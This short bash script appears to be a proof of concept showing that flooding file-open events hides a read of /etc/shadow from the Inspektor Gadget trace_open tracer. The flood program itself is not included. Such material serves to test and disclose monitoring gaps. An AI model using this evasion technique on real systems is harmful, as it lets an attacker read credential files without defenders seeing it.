#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
echo "Make sure ig is running in another terminal:"
echo "  sudo ig run trace_open"
echo ""
echo "Press Enter to continue..."
read -r


sudo docker run --rm \
    --name poc-flood-attacker \
    -v "${SCRIPT_DIR}/flood.c:/src/flood.c:ro" \
    gcc:latest \
    bash -c '
      echo "Opening /etc/shadow (THIS IS TRACKED)" &&
      cat /etc/shadow >/dev/null &&
      gcc -O2 -o /tmp/flood /src/flood.c -Wall &&
      /tmp/flood &
      sleep 2 ;
      echo "Opening /etc/shadow (THIS IS STEALTHY)" &&
      cat /etc/shadow >/dev/null
      '

